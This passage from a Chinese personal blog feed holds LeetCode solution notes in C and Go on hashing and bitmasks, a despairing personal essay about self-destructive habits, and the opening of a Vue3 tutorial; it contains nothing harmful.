class="built_in">strncpy</span>(key,s+i,<span class="number">10</span>);</span><br><span class="line">               key[<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">               insert(<span class="built_in">map</span>,key,result,returnSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  <span class="comment">// 释放哈希表中的键的内存</span></span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果还是超时了，，，，，</p><p>时间复杂度是没问题的<code>O(n)</code>，关键居然是<code>HashSize</code>，改成<code>len*3</code>是最优解。修改了hash算法，节省时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* key;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">int</span> used;</span><br><span class="line">&#125; HashEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    HashEntry* data;</span><br><span class="line">    <span class="type">int</span> size;    <span class="comment">//hashbiao长度</span></span><br><span class="line">&#125; HashMap;</span><br><span class="line"></span><br><span class="line">HashMap* <span class="title function_">createHashMap</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    HashMap* <span class="built_in">map</span> = (HashMap*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));</span><br><span class="line">    <span class="built_in">map</span>-&gt;data = (HashEntry*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));</span><br><span class="line">    <span class="built_in">map</span>-&gt;size = size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">       <span class="built_in">map</span>-&gt;data[i].used = <span class="number">0</span>; <span class="comment">// 初始化为未使用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap* <span class="built_in">map</span>, <span class="type">char</span>* key, <span class="type">char</span>** result, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="built_in">abs</span>(hashString(key)) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data[hash].used&gt;=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;data[hash].key, key) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 找到重复的子序列，存入结果数组</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data[hash].used == <span class="number">1</span>) &#123;</span><br><span class="line">                result[*returnSize] = strdup(key);</span><br><span class="line">                (*returnSize)++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未找到重复的子序列，插入当前子序列</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].key = strdup(key);</span><br><span class="line">    <span class="built_in">map</span>-&gt;data[hash].used++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hashString</span><span class="params">(<span class="type">char</span>* str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        hash = (hash &lt;&lt; <span class="number">2</span>) | (*str - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>);</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>** <span class="title function_">findRepeatedDnaSequences</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">10</span>)&#123;</span><br><span class="line">        HashMap* <span class="built_in">map</span> = createHashMap(len*<span class="number">3</span>);</span><br><span class="line">        <span class="type">char</span>** result = <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(*result));</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;len<span class="number">-9</span>;i++)&#123;</span><br><span class="line">               <span class="type">char</span> key[<span class="number">11</span>];</span><br><span class="line">               <span class="built_in">strncpy</span>(key,s+i,<span class="number">10</span>);</span><br><span class="line">               key[<span class="number">10</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">               insert(<span class="built_in">map</span>,key,result,returnSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  <span class="comment">// 释放哈希表中的键的内存</span></span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">map</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="DAY5-318-最大单词长度乘积"><a href="#DAY5-318-最大单词长度乘积" class="headerlink" title="DAY5-318.最大单词长度乘积"></a>DAY5-318.最大单词长度乘积</h4><p><a href="https://leetcode.cn/problems/maximum-product-of-word-lengths/">318. 最大单词长度乘积</a></p><h6 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h6><p>&#x3D;&#x3D;中等&#x3D;&#x3D;</p><blockquote><p>给你一个字符串数组 <code>words</code> ，找出并返回 <code>length(words[i]) * length(words[j])</code> 的最大值，并且这两个单词不含有公共字母。如果不存在这样的两个单词，返回 <code>0</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;abcw&quot;,&quot;baz&quot;,&quot;foo&quot;,&quot;bar&quot;,&quot;xtfn&quot;,&quot;abcdef&quot;]</span><br><span class="line">输出：16 </span><br><span class="line">解释：这两个单词为 &quot;abcw&quot;, &quot;xtfn&quot;。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;a&quot;,&quot;ab&quot;,&quot;abc&quot;,&quot;d&quot;,&quot;cd&quot;,&quot;bcd&quot;,&quot;abcd&quot;]</span><br><span class="line">输出：4 </span><br><span class="line">解释：这两个单词为 &quot;ab&quot;, &quot;cd&quot;。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;a&quot;,&quot;aa&quot;,&quot;aaa&quot;,&quot;aaaa&quot;]</span><br><span class="line">输出：0 </span><br><span class="line">解释：不存在这样的两个单词。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>2 &lt;= words.length &lt;= 1000</code></li><li><code>1 &lt;= words[i].length &lt;= 1000</code></li><li><code>words[i]</code> 仅包含小写字母</li></ul></blockquote><h6 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h6><ul><li>位运算-[位掩码]</li><li>数组</li><li>字符串</li></ul><h6 id="位掩码"><a href="#位掩码" class="headerlink" title="位掩码"></a>位掩码</h6><blockquote><p>位掩码（BitMask），是”位（Bit）“和”掩码（Mask）“的组合词。”位“指代着二进制数据当中的二进制位，而”掩码“指的是一串用于与目标数据进行按位操作的二进制数字。组合起来，就是”用一串二进制数字（掩码）去操作另一串二进制数字“的意思。</p></blockquote><p>有一个很经典的算法题，说是有1000个一模一样的瓶子，其中有999瓶是普通的水，有一瓶是毒药。任何喝下毒药的生物都会在一星期之后死亡。现在，你只有10只小白鼠和一星期的时间，如何检验出哪个瓶子里有毒药？如果按照常规的解法是不是很繁琐，我们不妨思考一下用二进制来处理。</p><p>具体实现跟3个老鼠确定8个瓶子原理一样：</p><p>000&#x3D;0<br>001&#x3D;1<br>010&#x3D;2<br>011&#x3D;3<br>100&#x3D;4<br>101&#x3D;5<br>110&#x3D;6<br>111&#x3D;7</p><pre><code>12345678</code></pre><p>一位表示一个老鼠，0-7表示8个瓶子。也就是分别将1、3、5、7号瓶子的药混起来给老鼠1吃，2、3、6、7号瓶子的药混起来给老鼠2吃，4、5、6、7号瓶子的药混起来给老鼠3吃，哪个老鼠死了，相应的位标为1。如老鼠1死了、老鼠2没死、老鼠3死了，那么就是101&#x3D;5号瓶子有毒。同样道理10个老鼠可以确定1000个瓶子。</p><blockquote><p>关于这道题</p></blockquote><ul><li>一共24个字母，我们就创建一个24位的数</li><li>对应的位上为1就说明该单词存在该字母</li><li>两个单词构造出的数进行按位与</li><li>如果值大于1说明有的位两个数都是1，就不满足条件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mask1 = <span class="number">0</span>, mask2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建位掩码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; word1[i] != <span class="string">&#x27;\0&#x27;</span>; ++i) &#123;</span><br><span class="line">    mask1 |= (<span class="number">1</span> &lt;&lt; (word1[i] - <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; word2[i] != <span class="string">&#x27;\0&#x27;</span>; ++i) &#123;</span><br><span class="line">    mask2 |= (<span class="number">1</span> &lt;&lt; (word2[i] - <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果两个位掩码的与运算结果为0，表示没有公共字母</span></span><br><span class="line"><span class="keyword">return</span> (mask1 &amp; mask2) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>有效降低这道题的时间复杂度</p><h6 id="C"><a href="#C" class="headerlink" title="C"></a>C</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(<span class="type">char</span> ** words, <span class="type">int</span> wordsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;wordsSize; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>;j &lt;wordsSize;j++) &#123;</span><br><span class="line">            <span class="type">int</span> mask1 = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> mask2 = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> leni = <span class="built_in">strlen</span>(words[i]);</span><br><span class="line">            <span class="type">int</span> lenj = <span class="built_in">strlen</span>(words[j]);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; leni; m++) &#123;</span><br><span class="line">                mask1 |= <span class="number">1</span> &lt;&lt; (words[i][m] - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; lenj; n++) &#123;</span><br><span class="line">                mask2 |= <span class="number">1</span> &lt;&lt; (words[j][n] - <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((mask1 &amp; mask2) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> len1 = <span class="built_in">strlen</span>(words[i]);</span><br><span class="line">                <span class="type">int</span> len2 = <span class="built_in">strlen</span>(words[j]);</span><br><span class="line">                <span class="type">int</span> product = len1*len2;</span><br><span class="line">                <span class="keyword">if</span>(product &gt; max) &#123;</span><br><span class="line">                    max = product;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *words[] = &#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;ba&quot;</span>,<span class="string">&quot;bc&quot;</span>&#125;;</span><br><span class="line">    <span class="type">int</span> wordsSize =  <span class="keyword">sizeof</span>(words) / <span class="keyword">sizeof</span>(words[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> result = maxProduct(words, wordsSize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>好好好，用了位运算还是超时是吧</li><li>等等，把循环的地方strlen放到循环前就过了，</li><li>时间还是太慢了，击败5%哈哈</li></ul><h6 id="Go-1"><a href="#Go-1" class="headerlink" title="Go"></a>Go</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxProduct</span><span class="params">(words []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">max := <span class="number">0</span></span><br><span class="line">wordsSize := <span class="built_in">len</span>(words)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; wordsSize; i++ &#123;</span><br><span class="line"><span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; wordsSize; j++ &#123;</span><br><span class="line">mask1 := <span class="number">0</span></span><br><span class="line">mask2 := <span class="number">0</span></span><br><span class="line">len1 := <span class="built_in">len</span>(words[i])</span><br><span class="line">len2 := <span class="built_in">len</span>(words[j])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m := <span class="number">0</span>; m &lt; len1; m++ &#123;</span><br><span class="line">mask1 |= <span class="number">1</span> &lt;&lt; (words[i][m] - <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> n := <span class="number">0</span>; n &lt; len2; n++ &#123;</span><br><span class="line">mask2 |= <span class="number">1</span> &lt;&lt; (words[j][n] - <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> mask1&amp;mask2 != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> len1*len2 &gt; max &#123;</span><br><span class="line">max = len1 * len2</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> max</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">words := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;ba&quot;</span>, <span class="string">&quot;bc&quot;</span>&#125;</span><br><span class="line">result := maxProduct(words)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231204180558587.png" alt="image-20231204180558587" style="zoom: 50%;" /><p>哎，时间复杂度</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20231123</title>
      <link href="/2023/11/23/20231123/"/>
      <url>/2023/11/23/20231123/</url>
      
        <content type="html"><![CDATA[<p>在大马路上狂奔周围的人都变得好慢。想逃出去，如果速度大于光速了就可以回到过去了，可是你不想回到过去，你哪也不想去，想逃出去。</p><p>运动的时候，早睡的时候，早起学习的时候，觉得自己已经在慢慢变成一个很好的人了，已经在慢慢长大了，以前喝咖啡的时候总告诉自己这是最后一罐了，等考上大学，等变得更好了，就再也不碰这傻逼玩意，结果你一直喝到现在，喝到吐，喝到想死，喝到咖啡因不耐受，你他吗才明白这些都是你吗骗人的。</p><p>你今天告诉自己要当一个卷b狠狠的学习狠狠的生活明天就在床上躺一整天晚上在酒馆里喝酒喝到烂醉喝到说不出话只会一个劲的道歉。烟抽了一根又一根明明没有瘾但是你停不下来，你就想知道你到底还可以烂到什么地步。</p><p>有一次你打开书准备学习，刚放下手机两分钟手表开始震动，你不想去回那些人的傻逼消息，不想回复任何人的关心，你只是有点困了，睡一觉起床就可以继续奋斗了，还没真正睡下去闹钟就响了，然后你发现人这一辈子也就那样了。总以为闹钟响了就睡醒了，就可以活力满满的开始生活了，到头来什么都没改变，除了时间什么都没改变。那干脆时间也别改变了，就停留在这个时间，就不用看着自己一点一点变差了。</p><p>谁他吗想整天跟个死人一样浑浑噩噩啊，充满负面情绪是一件很酷的事情吗，你看着那些自称有病胡乱吃药的人就觉得他们好可怜，还得通过这种方式来博得周围人的关注，换取同情心，到头来你自己也他妈是这种人。</p><p>身体是你自己的你比谁都清楚你还不想死，你真的想变得更好真的想把自己想抓住的东西通通抓住，但事实就是你什么也抓不住。以前抓不住以后也抓不住。但是你的字典里面没有半途而废这个说法，这你是知道的，当初学竞赛的时候你知道坚持下去死路一条但是你不可能放弃，这就是你唯一沾沾自喜的东西了。过了这么多年没找到活下去的意义就剩一点偏激的幻想苟活着你觉得也挺可怜的，但是你找不到别的路了。除了一个劲的堕落一个劲的腐烂你找不到别的路可以走了。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3</title>
      <link href="/2023/11/23/Vue3/"/>
      <url>/2023/11/23/Vue3/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>vue是渐进式JavaScript框架，易学易用，性能出色，使用场景丰富的Web前端框架。它基于标准HTML、CSS和JavaScript构建，并提供了一套声明式、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue都可以胜任</p><h3 id="渐进式框架"><a href="#渐进式框架" class="headerlink" title="渐进式框架"></a>渐进式框架</h3><p>Vue是一个框架，也是一个生态。其功能覆盖了大部分前端开发常见的需求。但Web世界是十分多样化的，不同的开发者在Web上构建的东西可能在形式和规模上会有很大的不同。考虑到这一点，Vue的设计非常注重灵活性和“可以被逐步集成“这个特点。根据你的需求场景，你可以用不同的方式使用Vue：</p><ul><li><p>无需构建步骤，渐进式增强静态的HTML</p></li><li><p>在任何页面中作为Web Components嵌入</p></li><li><p>单页应用(SPA)</p></li><li><p>全栈&#x2F;服务端渲染(SSR)</p></li><li><h6 id="Jamstack-静态站点生成-SSG"><a href="#Jamstack-静态站点生成-SSG" class="headerlink" title="Jamstack&#x2F;静态站点生成(SSG)"></a>Jamstack&#x2F;静态站点生成(SSG)</h6></li><li><p>开发桌面端、移动端、WebGL，甚至是命令行终端中的界面</p></li></ul><h4 id="Vue版本"><a href="#Vue版本" class="headerlink" title="Vue版本"></a>Vue版本</h4><p>目前主要是两个大版本：Vue2和Vue3.老项目一般都是Vue2，新项目一般都Vue3.Vue3涵盖了Vue2的东西，学会了vue3就能用vue3</p><h4 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h4><blockquote><p><a href="https://cn.vuejs.org/">vue官方文档</a></p></blockquote><h4 id="VueAPI风格"><a href="#VueAPI风格" class="headerlink" title="VueAPI风格"></a>VueAPI风格</h4><p>vue的组件可以按两种不同的风格书写：<strong>选项式API</strong>和<strong>组合式API</strong>，大部分的核心概念在这两种风格之间都是通用的，熟悉了一种风格之后，也可以很快理解另一种风格。</p><ul><li><p>选项式API</p><ul><li>可以用包含多个选项的对象来描述组件的逻辑，例如<code>data</code>,<code>method</code>,<code>mounted</code>。选项所定义的属性会暴露在函数内部的<code>this</code>上，它会执行当前的组件实例</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                count:0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            increment() &#123;</span><br><span class="line">                this.count++</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        mounted() &#123;</span><br><span class="line">            console.log(`The initial count is $&#123;this.count&#125;.`)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;botton @click=&quot;increment&quot;&gt;选项式API：count is : &#123;&#123;count&#125;&#125;&lt;/botton&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li><li><p>组合式API(Composition API)</p><ul><li>可以使用导入的API函数来描述组件逻辑</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">    import &#123; ref, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line">    const count = ref(0)</span><br><span class="line">    function increment() &#123;</span><br><span class="line">        count.value++</span><br><span class="line">    &#125;</span><br><span class="line">    onMounted(() =&gt; &#123;</span><br><span class="line">        console.log(`The initial count is $&#123;count.value&#125;.`)</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;botton @click=&quot;increment&quot;&gt;组合式API：count is : &#123;&#123;count&#125;&#125;&lt;/botton&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="创建Vue项目"><a href="#创建Vue项目" class="headerlink" title="创建Vue项目"></a>创建Vue项目</h2><p><code>npm init vue@latest</code></p><p>这一指令会安装并执行<code>creat-vue</code>，它是Vue官方的项目脚手架工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">D:\code\vue\start1&gt;npm init vue@latest</span><br><span class="line"></span><br><span class="line">Vue.js - The Progressive JavaScript Framework</span><br><span class="line"></span><br><span class="line">√ 请输入项目名称： ... 